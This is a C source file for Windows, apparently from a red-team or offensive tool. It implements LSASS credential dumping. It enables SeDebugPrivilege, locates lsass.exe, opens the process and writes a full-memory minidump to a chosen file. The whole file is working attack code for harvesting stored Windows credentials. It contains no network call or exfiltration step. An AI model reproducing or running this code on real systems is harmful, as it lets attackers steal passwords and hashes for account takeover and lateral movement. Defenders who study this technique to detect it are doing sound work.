/*

--- LSASS dump functions.

*/
#include <Windows.h>
#include <TlHelp32.h>
#include <minidumpapiset.h>
#include <tchar.h>
#include "LSASSDump.h"

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
    LUID luid;
    BOOL bRet = FALSE;

    if (LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
    {
        TOKEN_PRIVILEGES tp;

        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;

        if (AdjustTokenPrivileges(hToken, FALSE, &tp, 0, (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
        {
            bRet = (GetLastError() == ERROR_SUCCESS);
        }
    }
    return bRet;
}

DWORD WINAPI dumpLSASSProcess(void* data) {
    HANDLE hProcessSnap;
    HANDLE hProcess;
    PROCESSENTRY32 pe32;

    TCHAR* outputDump = (TCHAR*)data;

    //Enable the SeDebugPrivilege
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        SetPrivilege(hToken, SE_DEBUG_NAME, TRUE);
        CloseHandle(hToken);
    }

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        _tprintf(TEXT("[!] LSASS dump failed: impossible to get snapshot of the system's processes (CreateToolhelp32Snapshot)\n"));
        return 1;
    }

    // Set the size of the structure before using it.
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process,
    // and exit if unsuccessful
    if (!Process32First(hProcessSnap, &pe32)) {
        _tprintf(TEXT("[!] LSASS dump failed: obtained invalid process handle\n")); // show cause of failure
        CloseHandle(hProcessSnap);          // clean the snapshot object
        return 1;
    }

    // Now walk the snapshot of processes, and look for lsass.
    do {
        if (_tcscmp(pe32.szExeFile, TEXT("lsass.exe"))) {
            continue;
        }

        hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
        if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE) {
            _tprintf(TEXT("[!] LSASS dump failed: couldn't open lsass memory (OpenProcesswith error 0x%x)\n"), GetLastError());
            return 1;
        }

        HANDLE hDumpFile = CreateFile(outputDump, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hDumpFile == INVALID_HANDLE_VALUE) {
            _tprintf(TEXT("[!] LSASS dump failed: couldn't create dump file (CreateFileA)\n"));
            return 1;
        }
        BOOL dumped = MiniDumpWriteDump(hProcess, pe32.th32ProcessID, hDumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
        if (!dumped) {
            _tprintf(TEXT("[!] LSASS dump failed: couldn't dump LSASS process (MiniDumpWriteDump with error 0x%x)\n"), GetLastError());
            return 1;
        }
        _tprintf(TEXT("[+] LSASS sucessfully dump to: %s\n"), outputDump);
        CloseHandle(hProcess);

    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return 0;
}